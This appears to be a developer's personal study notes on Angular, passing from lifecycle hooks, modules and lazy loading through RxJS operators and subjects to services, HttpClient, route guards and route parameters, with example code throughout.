	  this.timerService.timerValue.next(0);
	  this.timerService.timerStatus.next("pause");
      }
      
      COMP2.component.TS
      ---------------------
      import { Component, OnDestroy, OnInit } from '@angular/core';
      import { Subscription } from 'rxjs';
      export class TimerV2ClicksComponent implements OnInit, OnDestroy {
      
      	timerStatSub!: Subscription;
	
	constructor(private timerService: TimerV2Service) { }
	
	ngOnInit(): void {
          this.timerStatSub = this.timerService.timerValue.subscribe((count: number)=> {
               this.timerVal = count;
             },
             (err: Error)=> {
               console.log(`ERROR in receving time value ==> ${err.message}`);
             });
        }
      	
	ngOnDestroy() {
    	  this.timerStatSub.unsubscribe();
  	}
      }


LIFECYCLE methods
==========================
After creating a component/directive by calling its constructor,
Angular calls the lifecycle hook methods in the following sequence at specific moments

constructor() {  }
The constructor method is not actually an Angular 2 method. 
It is a predefined method in a TypeScript class which is called when the class is instantiated. 
The constructor’s purpose is to help prepare the creation of a new instance of the class.
In the context of Angular 2 it can be used to properly initialize fields.
Angular 2’s DI (dependency injection) also tries to find providers that match the types of the constructor’s parameters, resolves them, and passes them to the constructor as arguments.

ngOnChanges()	 {  }
Respond when Angular (re)sets data-bound @Input properties.
Called before ngOnInit() and whenever one or more data-bound @Input properties change.
The method receives a SimpleChanges object of current and previous property values.
example:
        TS  (child.comp.ts)
        @Input() varOfChild: string;
        
        ngOnChanges(changes: SimpleChanges) {
          for (let propName in changes) {
            let chng = changes[propName];               // propName = varOfChild
            let cur  = chng.currentValue;               // any
            let prev = chng.previousValue;              // any
            let firstChange = chng.isFirstChange();     // boolean
          }
        }
        HTML  (parent.comp.html)
        <childComp [varOfChild]="varFromParentTS"></childComp>

ngOnInit()    {  }
Called once, after the first ngOnChanges().
meaning that all of the injected dependencies will be resolved and all of the class members will be defined.
This makes it the perfect place to do any of the initialization work/logic for the component.

ngDoCheck()	
Detect and act upon changes that Angular can't or won't detect on its own.
Called during every change detection run, immediately after ngOnChanges() and after ngOnInit() on the first run.

ngAfterContentInit()
Content is what is passed as children usually to be projected at some <ng-content> element of a component.
View is the template of the current component.
Respond after Angular projects external content into the component's view / the view that a directive is in.
Called once after the first ngDoCheck().

ngAfterContentChecked()	
Respond after Angular checks the content projected into the directive/component.
Called after the ngAfterContentInit() and every subsequent ngDoCheck().

ngAfterViewInit()
Content is what is passed as children usually to be projected at some <ng-content> element of a component.
View is the template of the current component.
Respond after Angular initializes the component's views and child views / the view that a directive is in.
Called once after the first ngAfterContentChecked().

ngAfterViewChecked()	
Respond after Angular checks the component's views and child views / the view that a directive is in.
Called after the ngAfterViewInit() and every subsequent ngAfterContentChecked().

ngOnDestroy()	
Cleanup just before Angular destroys the directive/component.
Unsubscribe Observables and detach event handlers to avoid memory leaks.
Called just before Angular destroys the directive/component.

Example:
Written in  ".component.ts"  of  respective COMPONENT
        export class COMPONENTNAME implements OnInit , OnChanges , OnDestroy{  }
        
        
        
Feature MODULES
=====================
> ng generate module <module_name>
> ng generate module <module_name> --routing               // Adds  `MODULE_NAME-route.module.ts`   routing file inside module created
- Having all (say 100s) components in one module (root module, app.module.ts) might make it difficult to debug
  plus it might make initial loading slower as all modules are to be loaded, if not used lazy loading, which is possible via submodules
- // example
  // 1. app-module.ts (ROOT module imports submodules)
  @NgModule({
     declarations: [AppComponent, AboutComponent, PageNotFoundComponent],
     imports: [ BrowserModule, EmployeesModule, CustomersModule, AppRoutingModule ],       // NOTE : root routing module must be after feature module ie at last, else it will load page not found component
                                                                                           // 'FormsModule' is not written as 'EmployeesModule' already imported it via 'SharedModule'
     bootstrap: [ AppComponent ]
  })
  export class AppModule { }
  
  // 2. app-routing-module.ts
  @NgModule({
     imports: [
       RouterModule.forRoot(appRoutes)                                                     // NOTE : use of 'RouterModule.forRoot()'
     ],
     exports: [ RouterModule ]
   })
   export class AppRoutingModule { }

  // 3. customer-module.ts
  @NgModule({
     declarations: [CustomersComponent, CustomerComponent],
     imports: [SharedModule, CustomersRoutingModule]
   })
   export class CustomersModule { }
   
   // 4. customer-routing-module.ts
   {path:'', component: CustomersComponent, canActivate: [CustomersLoadGuardService], resolve: {customers: CustomersResolverService}},
   {path:'customers/<COMPONENT_NAME>/edit/:id', component: CustomerDetailComponent }
   @NgModule({
      imports: [
        RouterModule.forChild(custRoutes)                                       // NOTE : use of 'RouterModule.forChild()' in submodules
      ],
      exports: [ RouterModule ]
   })
   export class CustomersRoutingModule { }
   
   // 5. employee-module.ts
   @NgModule({
      declarations: [EmployeesComponent, EmployeeComponent],
      imports: [SharedModule, EmployeesRoutingModule]
   })
   export class EmployeesModule { }
   
   // 6. employee-routing-module.ts
   {path:'', component: EmployeeComponent, canActivate: [EmployeeLoadGuardService], resolve: {employees: EmployeeResolverService}},
   {path:'employees/<COMPONENT_NAME>/edit/:id', component: EmployeeDetailComponent }
   @NgModule({
      imports: [
        RouterModule.forChild(empRoutes)                                        // NOTE : use of 'RouterModule.forChild()' in submodules
      ],
      exports: [ RouterModule ]
   })
   export class EmployeesRoutingModule { }
   
   // 7. shared-module.ts
   @NgModule({
      declarations: [],
      imports: [],
      exports: [                                                // Being a shared module , it has common functionality required for all modules and export them
                                                                // NOTE : shared module cannot have 'providers' ie we cannot include @Injectable class (service class)
                                                                          because services which act as singletons, could end up being provided multiple times, especially for lazy-loaded modules.
        CommonModule,                                           // since 'CommonModule', 'FormsModule', 'SearchFilterPipe' is exported here and
        FormsModule,                                               we imported 'shared-module' in 'customer-module' which is in turn is imported in app-module (root)                   
        SearchFilterPipe
      ]
    })
    export class SharedModule { }
    
    // 8. searchfilterpipe.ts
    @Pipe({name: 'searchFilter'})
    export class SearchFilterPipe implements PipeTransform{
       transform(items: any[], args: string): any[] {
          let searchFilter: string = args ? args.toLocaleLowerCase() : null;
          return searchFilter ? items.filter((item) => {item.name.toLocaleLowerCase().startsWith(searchFilter) != false}) : items;
    }}


LAZY LOADING
===================
- NOTE :  Creating submodules / feature modules do not ensure lazy loading. We need to configure routing module for same.
- There are three types of module loading
  - Eager loading                        (default)                                   (all modules loaded initially)
  - Lazy Loading without Pre-Loading     (default, when configured for lazy loading) (modules loaded only when required)
  - Lazy Loading with Pre-Loading                                                    (modules loaded by browser in background when it is not involved in any other activity)
  // example
  // 1. app-routing-module.ts     (ROOT routing module)
  // this will make modules to be lazy loaded
  { path: 'employees', loadChildren: () => import('./employees/employees.module').then(m => m.EmployeesModule) },
  { path: 'customers', loadChildren: () => import('./customers/customers.module').then(m => m.CustomersModule) },
  
  // this will enable/disable preloading
  @NgModule({
    imports: [
     RouterModule.forRoot(appRoutes)                                                   // default,       no preloading
  // RouterModule.forRoot(appRoutes, {preloadingStrategy: NoPreloading})               // same as above, no preloading
  // RouterModule.forRoot(appRoutes, {preloadingStrategy: PreloadAllModules})          // preload modules when browser is idle
    ],
    exports: [ RouterModule ]
  })
  export class AppRoutingModule { }
  
  // 2. customers/employees-routing-module.ts
  // NOTE : do not specify name of modules in url i.e. {path: 'customers/<COMPONENT_NAME>/:id'} because it is already specified in root i.e. {path:'customers'}
  {path:'', component: CustomersComponent, canActivate: [CustomersLoadGuardService], resolve: {customers: CustomersResolverService}},
  {path:'<COMPONENT_NAME>/edit/:id', component: CustomerDetailComponent }
  
  // 3. app-module.ts
  @NgModule({
     declarations: [AppComponent, AboutComponent, PageNotFoundComponent],
     imports: [ BrowserModule, AppRoutingModule ],                          // NOTE : Do not include feature modules i.e. 'CustomersModule', 'EmployeesModule' here as they are to be lazy loaded
     bootstrap: [ AppComponent ]
  })
  export class AppModule { }


create your own OBSERVABLES | RxJS operators
==============================================
- Observables are lazy
- Observables can have multiple values over time
- Observables “push” values to subscribers
- “next()”     : sends any value such as Numbers, Arrays or objects to it’s subscribers.
  “error()”    : sends a Javascript error or exception.
  “complete()” : does not send any value.
- During observable execution there can be an infinite calls to the `observer.next()`, 
  however when `observer.error()` or `observer.complete()` is called, execution stops and no more data will be delivered to subscribers.
- Since each execution is run for every subscriber it’s important to not keep subscriptions open for subscribers that don’t need data anymore, 
  as that would mean a waste of memory and computing power. When you subscribe to an observable, you get back a subscription, which represents the ongoing execution. 
  Just call unsubscribe()to cancel the execution.
- Example
import { Observable } from "rxjs/Observable";
A // create observable | new Observable((obs)=> {})     OR    Observable.create((obs)=> {})
    const simpleObservable = new Observable((observer) => {  
       // observable execution
       observer.next("bla bla bla");
       observer.complete();
   });
   // create variable or subject to check for unsubscribe
   private observableSub: Subscription;
   // OR
   private unsubscribe: Subject<void> = new Subject<void>();
B. // subscribe to the observable, it accepts success function, error function, completion function
   // NOTE: An error CANCELs observable , it cannot emit new values. This is not same as COMPLETION and thus if error occurrs completion function won't run.
   this.observableSub = simpleObservable.subscribe((data: any)=> {}, (err: Error)=> {}, ()=> {});
   //   OR
   simpleObservable.pipe(takeUntil(this.unsubscribe)).subscribe((data: any)=> {}, (err: Error)=> {}, ()=> {});
C. // dispose the observable, inside ngOnDestroy()
   observableSub.unsubscribe();
   //   OR
   this.unsubscribe.next();
   this.unsubscribe.complete();
   
a) pipe() | skip() | take() | takeUntil() | takeWhile() | retry() | catchError() | throwError()
pipe() function takes as its arguments the functions you want to combine, and returns new function that, when executed, runs composed functions in sequence.
skip() allows to ignore first x emissions from the source. It is oppposite to take().
take() operator specify how many values to receive from Observable before unsubscribe i.e. when received specified number of values, unsubscribe automatically.
takeUntil() operator receive values from Observable until other specified Observable emits new value i.e. .next() and .complete() from other obsv.
takeWhile() operator continue receiving values until specified func returns true. Once it becomes false, unsubscribe automatically.
retry() operator lets you retry a failed request. NOTE : Use the retry operator before the catchError operator.
catchError() is a function that takes in input Observable, and outputs an Output Observable. We need to pass it a function which is error handling function.
Example:
const apiData = ajax('/api/data').pipe(
  skip(5),
  take(10),
  takeWhile(val => val < 3),
  map((res: any) => {
    if (!res.response) {
      console.log('Error occurred.');
      throw new Error('Value expected!');
    }
    return res.response;
  }),
  retry(3),                                                           // Retry up to 3 times before failing
  catchError((err: Error) => { return throwError(err.message); })
);

b) concatMap() | mergeMap() | switchMap() | exhaustMap() | forkJoin() | shareReplay()
Example:
this.form.valueChanges.pipe(MAP_OPERATOR(formValue => this.http.put(`/api/course/${courseId}`, formValue))).subscribe();
- concatMap()
  It takes the first Observable and use its values, wait for it to complete and then we use the next Observable, etc. until all Observables complete.
- mergeMap()
  It is similar to Promise.all([p1, p2]) i.e. The result Observable will not be completed until all the merged Observables are completed.
  mergeMap don't wait for the previous inner Observable to complete before triggering the next innner Observable i.e. it subscribes to all observables in parallel.
  we can have multiple inner Observables overlapping over time, emitting values in parallel.
- switchMap()
  if a new Observable starts emitting values we are then going to unsubscribe from the previous Observable, before subscribing to the new Observable.
- exhaustMap()
  if a new Observable starts emitting values we are then going to ignore new values in the source Observable until the previous value is completely processed.
- forkJoin()
  when we make multiple HTTP requests(to same/different server) and wait until get responses from all HTTP requests for rendering view.
  forkJoin waits for each HTTP request to complete and group’s all observables returned by each HTTP call into a single observable array
  and finally return that observable array.
  Eg:
  SERVICE.TS
    let response1 = this.http.get(requestUrl1);
    let response2 = this.http.get(requestUrl2);
    let response3 = this.http.get(requestUrl3);
    return forkJoin([response1, response2, response3]);
  COMP.TS  
    SERVICEMETHOD().subscribe((responseList) => {
        this.responseData1 = responseList[0];
        this.responseData2 = responseList[1];
    	this.responseData3 = responseList[2];
    });
- shareReplay()
  It is similar to ReplaySubject. Share source and replay last specified number of emissions on subscription.
  It is used to cache HTTP response in app to avoid computations run again i.e. late subscribers to a stream that needs access to previously emitted values.
  Default is all previous values, else we may specify number of previous values too.
  Eg:
  SERVICE.TS
    return this._http.get(URL).pipe(shareReplay(1));
  COMP_1.TS
    SERVICEMETHOD().subscribe();
  COMP_2.TS
    SERVICEMETHOD().subscribe();

c) Subject | BehaviorSubject | ReplaySubject | AsyncSubject
An RxJS Subject is a special type of Observable that allows values to be multicasted to many Observers. 
A Subject can multicast to many Observers. Subjects are like EventEmitters: they maintain a registry of many listeners.
Subjects are the only way of making any Observable execution be SHARED to multiple Observers.
Using SUBJECT we can communicate between sibling components, who will subscribe to subject and then will get updated on emit of event.
Example:
import { Subject, from } from 'rxjs';
const subject = new Subject<number>();
subject.subscribe({
  next: (v) => console.log(`observerA: ${v}`)
});
subject.subscribe({
  next: (v) => console.log(`observerB: ${v}`)
});
const observable = from([1, 2, 3]);
observable.subscribe(subject);
// OUTPUT LOGS:
// observerA: 1
// observerB: 1
// observerA: 2
// observerB: 2
// observerA: 3
// observerB: 3

BehaviorSubject has a notion of "the current value". 
It stores latest value emitted to its consumers, and whenever new Observer subscribes, it will immediately receive "current value" from the BehaviorSubject.
Example:
import { BehaviorSubject } from 'rxjs';
const subject = new BehaviorSubject(0);             // 0 is the initial value
subject.subscribe({
  next: (v) => console.log(`observerA: ${v}`)
});
subject.next(1);
subject.next(2);
subject.subscribe({
  next: (v) => console.log(`observerB: ${v}`)
});
subject.next(3);
// Logs
// observerA: 0
// observerA: 1
// observerA: 2
// observerB: 2
// observerA: 3
// observerB: 3

ReplaySubject records multiple values from the Observable execution and replays them to new subscribers.
When creating a ReplaySubject, you can specify how many values to replay i.e. past how many values to send to new subscriber instead of just "current value"
Example:
import { ReplaySubject } from 'rxjs';
const subject = new ReplaySubject(3);              // buffer 3 values for new subscribers
subject.subscribe({
  next: (v) => console.log(`observerA: ${v}`)
});
subject.next(1);
subject.next(2);
subject.next(3);
subject.next(4);
subject.subscribe({
  next: (v) => console.log(`observerB: ${v}`)
});
subject.next(5);
// Logs:
// observerA: 1
// observerA: 2
// observerA: 3
// observerA: 4
// observerB: 2
// observerB: 3
// observerB: 4
// observerA: 5
// observerB: 5

AsyncSubject is a variant where only "current value" of the Observable execution is sent to its observers, and only when the execution completes.
It waits for the complete notification in order to deliver a single value.
Example:
import { AsyncSubject } from 'rxjs';
const subject = new AsyncSubject();
subject.subscribe({
  next: (v) => console.log(`observerA: ${v}`)
});
subject.next(1);
subject.next(2);
subject.next(3);
subject.next(4);
subject.subscribe({
  next: (v) => console.log(`observerB: ${v}`)
});
subject.next(5);
subject.complete();
// Logs:
// observerA: 5
// observerB: 5


Title Service
====================
Title service is part of Browser platform and provides an API for getting and setting current HTML document title.
Using browser's document object and set title manually i.e. using document.title will be dirty
and undermines chances of running app outside of a browser (server-side,pre-rendering) someday.
Eg:
import { Title } from '@angular/platform-browser';
export class MyComponent {
  public constructor(private titleService: Title) { }
  
  ngOninit() {
    let oldTitle = this.titleService.getTitle();
    this.titleService.setTitle(`oldTitle - ${newTitle}`);
  }
}


SERVICE
====================
Write a     ".service.ts"   file for COMPONENT   and  use   @Injectable()  decorator over   export class ServiceClass{  }
            > ng generate service <SERVICE_NAME>

Inject in     ".component.ts"  file  of COMPONENT using   constructor()

A) declare this service class in "providers" array of ROOT module metadata i.e.  "app.module.ts"  to have same instance of this service, app wide, all down the hierarchy.
            OR
   add metadata providedIn: 'root' to @Injectable({}) decorator , it prevents need to write in "providers" array of app.module.ts.
   However, it is always recommended to add service class to providers array as above behavior may change in coming versions.
   
B.1.) declare this service class in "providers" array of EAGERLY LOADED SUB module metadata i.e. "MODULE.ts"  to have same instance app wide.
      this is same as declaring in providers of "app.module.TS"   or   adding providedIn: 'root' metadata to @Injectable({}) decorator.
   
B.2.) declare this service class in "providers" array of LAZY LOADED SUB module metadata i.e. "MODULE.ts"  to have different instance, but same within sub-module only
      eg: if service provided in both providers array of ROOT module and sub-module, we will have two instances of that service
   
C) declare this service class in "providers" array of COMPONENT metadata to have different instance, but same within component & it's child components only.
   eg: if service provided in both providers array of ROOT module and component, we will have two instances of that service
   
   
ENVIRONMENT PROPERTIES
--------------------------
> src\environments\environment.prod.ts          (used in production build)
> src\environments\environment.ts               (used in development mode)
These files provide global scope for variables. eg: TOKEN-KEY, BACKEND-URL, SSH-KEYS etc...
Specify keys-values in both files per environment specific as Angular automatically makes use of these two files as per environment it is being run on.
Eg:
 > environment.ts
   export const environment = {
  	production: false,
	API_URL: "https://uhc-backend-DEV-URL"
   };
 > environment.prod.ts
   export const environment = {
  	production: true,
	API_URL: "https://uhc-backend-PROD-URL"
   };
 > .service.TS
   import { environment } from 'PATH-TO-DEV-ENVIRONMENT.TS-FILE';
   let endpoint = `${environment.API_URL}/login`;


COMMUNICATION with SERVICE
---------------------------
NOTE      : MAKE sure to install JSON SERVER   "npm install -g json-server"
Reference :                                    "https://github.com/typicode/json-server"

NOTE : JSON-Server uses default KEYWORD  "id"
Create a .JSON file under dir        "PROJ\src\"

CHANGE DIR to your .JSON file's dir  "PROJ\src\"
Start JSON SERVER                              "json-server -–watch filename.json"       // --watch keeps check over any changes made

OPEN new TERMINAL window
CHANGE DIR to "PROJ"  as it is where "package.json" is present
Start ng      "ng serve"

declare  "HttpClientModule" in  "imports"  of  "app.module.ts"

configure ".service.ts"

CREATE    "interface.ts"  file and export interface
           > ng generate interface <INTERFACE_NAME>

configure ".component.ts" file



Use of HttpClientModule
------------------------
HTTP request is made in browser using either XMLHttpRequest or fetch().
import {HttpClientModule} from "@angular/common/http" and included in imports[] array.
HttpClientModule provides testability features, typed request and response objects, request and response interception, Observable APIs, Streamlined error handling.
-- PROMISE         (SUCCESS data , ERROR data)
-- OBSERVABLES     (SUCCESS data , ERROR data , DONE)  these are required to be SUBSCRIBED , .subscribe() triggers execution of  OBSERVABLES and causes HttpClient to compose and send request to server.
-- JSON SERVER     (a .json file is to be added in src of PROJECT)

import {HttpHeaders} from "@angular/common/http"
const httpOptions = {
  headers: new HttpHeaders({
    'content-type' : 'application/json',
    'authorization' : 'tokenValue'
  })
}
import 'rxjs' in app.module.ts     // RxJS is a library for reactive programming using Observables, to make it easier to compose asynchronous or callback-based code.


Difference between "ActivatedRoute" and "ActivatedRouteSnapshot"
===================================================================
NOTE : Generally speaking, subscribing is the safest i.e. use ActivatedRoute

Use the Snapshot if you only need the initial value of the parameter once during the component's initialization, 
and don't expect the URL to change while the user is still on that same component.
Using snapshot will have two versions of ActivatedRouteSnapshot for the same ActivatedRoute with different params.
Example : if on a `product/2` route, and the only way to get to `product/3` is by going back and then clicking a product detail 
i.e. (leaving the detail component, then re-opening it with a new route param)

Use the Observable if it's possible for the route to change while the user is still on the same component, 
and hence Component's initialization would not be called again, but observable would call your subscribed logic when the URL changed.
Example : if on a `product/2` route, and you have a "next" button to go to the next id record `product/3`.
i.e. (did not leave/re-open the component but the URL did receive a new param)


CLIENT SIDE ROUTING
=============================
Import and write in "imports"   of     "app.module.ts"   the routing object which was exported from "app.routing-module.ts"

NOTE : wherever define <router-outlet></router-outlet> directive that acts as a placeholder for routing module urls output shown there
       Using multiple <router-outlet></router-outlet> in same template, it will consider LAST <router-outlet></router-outlet> of file to render content.
       To overcome this i.e. have multiple <router-outlet></router-outlet> in same template, we can use NAMED <router-outlet></router-outlet>
       However it is RELATIVE to PRIMARY <router-outlet></router-outlet> and adding leading '/' for routerLink will NOT work.
       The URL for a secondary route uses the following syntax to specify both primary and secondary routes at same time.
         https://base-path/PRIMARY-ROUTER-OUTLET-PATH(OUTLET-NAME-1:OUTLET-PATH-1//OUTLET-NAME-2:OUTLET-PATH-2)
       Eg:
       .HTML
         <a routerLink='A'>A</a>
	 <a routerLink='B'>B</a>
	 <a [routerLink]='[{ outlets: { OUTLET-NAME-1: ["C"] } }]'>C</a>
	 <a [routerLink]='[{ outlets: { OUTLET-NAME-2: ["D",VAR-FROM-TS] } }]'>D</a>
	 <router-outlet></router-outlet>                                         // IGNORED, as same <router-outlet></router-outlet> exists below too
	 <router-outlet name='OUTLET-NAME-1'></router-outlet>			 // C RENDER here, names are different for C and D
	 <router-outlet></router-outlet>					 // A,B RENDER here
	 <router-outlet name='OUTLET-NAME-2'></router-outlet>			 // D RENDER here
       .TS
         const routes: Routes = [
	 	{ path: 'A', component: AComponent },
		{ path: 'B', component: BComponent },                             // A,B will render to <router-outlet></router-outlet>
		{ path: 'C', component: CComponent, outlet: 'OUTLET-NAME-1' },    // C will render to <router-outlet name='OUTLET-NAME-1'></router-outlet>
		{ path: 'D/:id', component: DComponent, outlet: 'OUTLET-NAME-2' } // D will render to <router-outlet name='OUTLET-NAME-2'></router-outlet>
	 ];
	 this.router.navigate([{ outlets: { OUTLET-NAME: 'PATH' } }]);

NOTE : <a href=""> ... </a>  sends request to BROWSER directly which reloads it and returns requested page but that is not how SPA should work,
       so use `routerLink` to send control to routerModule
- If the link is static, we can use                                <a routerLink="/product/iPhone"></a>
  If the link is dynamic, , NOTE : use of '' inside string         <a [routerLink]="['/staticURLArg', dynamicArg_VAR, 'staticURLArg']"></a>
  NOTE: Add leading '/' to provide absolute path. The path name will get appended after HOSTNAME.
        Without leading '/' or using './'   i.e.  './staticURLArg'  , it is relative path and path name will get appended after current URL path in address.
        Relative paths can also be specified using '../../' i.e. '../../staticURLArg' ,which moves dir level up as routerLink knows in which COMPs template it is being written

- Set single CSS class to active link using                        routerLinkActive="CSS_Class"
  Set multiple CSS classes , NOTE : use of '' inside string        [routerLinkActive]="['CSS_CLASS_1', 'CSS_CLASS_2']"

- For exact match of urls use                                      [routerLinkActiveOptions]="{exact:true}"
  For partial match  ,  eg:- employees/:DYNAMIC_ROUTING , DO NOT use {exact:true}
  
- To programatically navigate to a path i.e. from .comp.TS file, use  this.router.navigate(['/timer-app-v2']);
  By default, it's behavior is Absolute path i.e. a leading slash is not mandatory for same. Still a good practice to add leading slash.
  To have Relative path, use `relativeTo` parameter and provide ActivatedRoute as it's value i.e.  this.router.navigate(['timer-app-v2'], {relativeTo: this.route});

Create file         "app.routing-module.ts"   in project's app component root dir , which contains urls/routes
                     NOTE : Do not put leading '/' in path, ANGULAR will put it automatically. It will rather give error if we add leading '/'
                     - examples
		       {path: '', component: 'BaseComponent'}                                  // empty path means BASE_URL ie '/'
                       {path: '', component: 'BaseComponent', pathMatch: 'full' }              // 'full': whole URL path needs to match , 'prefix'(default)
		       {path: "home", redirectTo: "/my-home"}                                  // redirection, Absolute if begins with (/) , else Relative to path specified. 
                       {path: 'URL', component: 'NameOfComponentClass', data: {dataVAR_IN_ROUTE: 'dataPassedToComponent'}}   // data accessed via ActivatedRoute in component
                       {path: 'employees', children: [                                         // specify children path to avoid writing 'employees/' again and again
                                  { path: '', component: EmployeesComponent },
                                  { path: 'add', component: AddEmployeeFormComponent},
                                  { path: ':id', component: EmployeeDetailComponent}]}
	               {path: 'employees', component: EmployeesComponent, children: [          // here we need other <router-outlet></router-outlet> in EmployeesComponent.html
                                  { path: 'add', component: AddEmployeeFormComponent},            this will let child component's view become available in parent component 
                                  { path: ':id', component: EmployeeDetailComponent}]}
                       {path: '**', component: 'NoneOfAboveURLMatchRequest'}                   // wildcard, must be written at last, when none of URLs match
                       {path: 'URL', component: '', canActivate: [RouteAuthServiceName], canDeactivate: [RouteAuthServiceName], 
		                                    canLoad: [RouteAuthServiceName], resolve: { dataVAR_IN_ROUTE: RouteAuthServiceName }}
                       // To restrict access to a URL/Component , there are 5 types of route guards :-
                              CanActivate     : Controls if route can be activated.
                              CanActivateChild: Controls if children of a route can be activated.
                              CanLoad         : Controls if route can even be loaded. 
                                                This becomes useful for feature modules that are lazy loaded. 
                                                They won’t even load if the guard returns false, thus cannot even see the source code of the module.
                                                It must be used with canActivate, because once loaded and user logged out, it will still be present in browser cache, guard will return true.
                              CanDeactivate   : Controls if the user can leave a route. 
                                                NOTE : This guard doesn’t prevent the user from closing the browser tab or navigating to a different address. 
                                                       It only prevents actions from within the application itself.
                              Resolve         : To complete data retrieval before navigating to a route
                                                Refer: loading.io/css    for loader's HTML (app.component.html) + CSS (app.component.css)
                                                NOTE : it uses NAVIGATION instance as written in app.component.ts (ROOT component)
                                                       plus get snapshot of data in component where the data is shown after retrieval
                                                // 1. app.component.ts
                                                export class AppComponent {
                                                   isLoading: boolean = true;        // variable for loader <div> i.e.   *ngIf="isLoading"
                                                   
                                                   constructor(private _authService: AuthService, private _router: Router) {
                                                      this._router.events.subscribe((event: Event) => {
                                                          if (event instanceof NavigationStart) {
                                                             this.isLoading = true;
                                                          }
                                                          else if (event instanceof NavigationEnd || event instanceof NavigationError || event instanceof NavigationCancel) {
                                                             this.isLoading = false;
                                                          }
                                                       }) 
                                                    }
                                                 }
                                                 // 2. component.ts
                                                 constructor(private _route: ActivatedRoute) {
                                                    // a. Not Preferred , using "ActivatedRouteSnapshot"
                                                    this.dataVAR_IN_COMPONENT = this._route.snapshot.data['dataVAR_IN_ROUTE'];
                                                    
                                                    // b. Preferred , to use "ActivatedRoute" and SUBSCRIBE
                                                    this._route.data.subscribe((data: Data) => {
                                                        console.log(`${data['dataVAR_IN_ROUTE']}`);
                                                    },
                                                    (err: Error) => {
                                                        console.error(`ERROR in DATA ==> ${err.message}`);
                                                    });
                                                 }
                           // we could specify multiple guards service for a route guard in a route, and they’ll be evaluated in the order in array for that route guard.
                           // NOTE : Declare route authentication service(s) name(s) in 'providers' array of respective '.module.ts'
                           // example - RouteAuthServiceName.ts
                           @Injectable()
                           export class RouteAuthServiceName implements CanActivate, CanDeactivate<ComponentNameToDeactivate>, CanLoad, Resolve<TYPE_OF_DATA_RETURN> {
                              constructor(private _productService: ProductService, private _router: Router) {}
                              
                              canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot): boolean {
                                 if(this.METHOD_VAR_IN_SERVICE) {                   // returns true/false , can be from other service as well  eg: this.authService.METHOD_VAR_IN_SERVICE
                                    return true;
                                 }
                                 else {
                                    this._router.navigate(['login']);
                                    return false;
                                 }
                              }
                              
                              canDeactivate(component: ComponentNameToDeactivate, route: ActivatedRouteSnapshot, state: RouterStateSnapshot): boolean {
                                 if (component.METHOD_VAR_IN_COMPONENT) {                   // returns true/false from a method/variable in component to be deactivated, 
                                                                                               we can make use of @ViewChild variables in component.ts
                                    return confirm('Are you sure?');
                                 }
                                 if(component.editProductForm.dirty && !component.formSubmitted) {
                                    return confirm(`You have unsaved changes. Are you sure to leave ?`);
                                 }
                                 else {
                                    return true;
                                 }
                              }
                              
                              canLoad(route: Route): boolean { }
                              
                              resolve(route: ActivatedRouteSnapshot, state: RouterStateSnapshot): Promise<TYPE_OF_DATA_RETURN> | Observable<TYPE_OF_DATA_RETURN> | any {
                                  if(state.url.indexOf("detail") != -1 || state.url.indexOf("edit") != -1) {
                                      return this._productService.getProduct(route.params['id']);
                                  }
                                  else if(state.url.indexOf("topproducts") != -1) {
                                      return this._productService.getTopProducts();
                                  }
                                  else {
                                      return this._productService.getAllProducts();
                                  }
                              }
                            }

DYNAMIC ROUTING
===================
REST APIs have certain types of parameters:
 - Header parameters: Parameters included in the request header, usually related to authorization.
 - Path parameters: Parameters within the path of the endpoint, before the query string (?).
 - Query string parameters: Parameters in the query string of the endpoint, after the ?.
 - Request body parameters: Parameters included in the request body. Usually submitted as JSON.
 - Fragment: appended to URL after query params(if any), with # symbol.
 
 1. Header parameters
 --------------------
 Example : ".service.ts"           , private httpOptions = {
                                        headers: new HttpHeaders({
                                          'Content-Type':  'application/json'
                                        }),
                                        params: {                                 // appended as query string parameters in request URL
                                          "chkP" : "namo ji",
                                          "chkP1" : "PM"
                                        },
					observe: 'events'                         // observe HTTP OPTION allows monitoring of request-response sequence
					                                             It has values: 'body'(default), 'response'(full response obj received i.e. status, headers)
										     'events'(seq. of events in req-resp lifecycle)
                                     };
                                     constructor(private _http: HttpClient) { }
                                     addProduct(HTTP_BODY) {
                                         return this._http.post(this._productsUrl, HTTP_BODY, this.httpOptions)
                                                          .pipe(tap((evt)=> { console.log(`${evt}`); 
							                      if(evt.type == HttpEventType.Sent) {} 
									      if(evt.type == HttpEventType.Response) {}
									      if(evt.type == HttpEventType.UploadProgress) {}
							                    }), 
							        catchError((err: Error) => { return throwError(err.message) })); }
 NOTE - To read HTTP RESPONSE HEADERS, use INTERCEPTORS.

 2. Path Parameters
 --------------------
  using colon (:) in path to attach path params with route.
  Example : "app.routing-module.ts" , {path : "PARENT-URL/:varname_1/:varname_2"}
            "component.html"        , <a routerLink="/dashboard/78990/kapoor">URL</a>
            
            "component.ts"          , constructor(private route: ActivatedRoute) {
                                          // a. Not Preferred , using "ActivatedRouteSnapshot"
                                          console.log(`${route.snapshot.params['varname_1']}`);           // 78990 i.e. value of varname_1 param
                                          console.log(`${route.snapshot.paramMap.get('varname_2')}`);     // kapoor i.e. same as above , using ParamMap
                                          console.log(`${route.snapshot.paramMap.keys}`);                 // ['varname_1', 'varname_2']
                                          
                                          // b. Preferred , using ActivatedRoute and SUBSCRIBE
                                          route.params.subscribe((param: Params) => {
                                              console.log(`${param['varname_1']}`);                      // 78990 i.e. value of varname_1 param
                                          });
                                          route.paramMap.subscribe((parammap: ParamMap) => {
                                              console.log(`${parammap.get('varname_2')}`);               // kapoor i.e. same as above , using ParamMap
                                              console.log(`${parammap.keys}`);                           // ['varname_1', 'varname_2']
                                          });
                                      }
                                      
 3. Query string parameters
 ----------------------------
  using [queryParams] in <a></a> OR in router.navigate([]) OR in HTTP options in a ".service.ts" to attach Query string params with route.
  queryParamsHandling, allow to handle query params while navigation, which in default behavior discards previous navigation route query params.
       'merge': Merge previous navigation route queryParams with given query params, i.e. both are provided to URL
       'preserve': Preserve previous navigation route query params only, i.e. discard given query params, only previous route query params provided to URL
  Example : "component.html"        , <a routerLink="/targetComp/78990/kapoor" [queryParams]="{q1: 'mapcolumns', q2: [163, 592, 586]}"></a>
                                    , <a [routerLink]="['/user/bob']" [queryParams]="{debug: true}" queryParamsHandling="merge"></a>
                                    OR
            "component.ts"          , this.router.navigate(['/targetComp'], { queryParams: { q1: 'mapcolumns', q2: [163, 592, 586]}});
	    			    , this.router.navigate(['/targetComp'], { queryParams: { q1: 'mapcolumns', q2: [163, 592, 586]} , queryParamsHandling: 'merge'});
                                    OR
            ".service.ts"           , REFER passing header or body parameter example
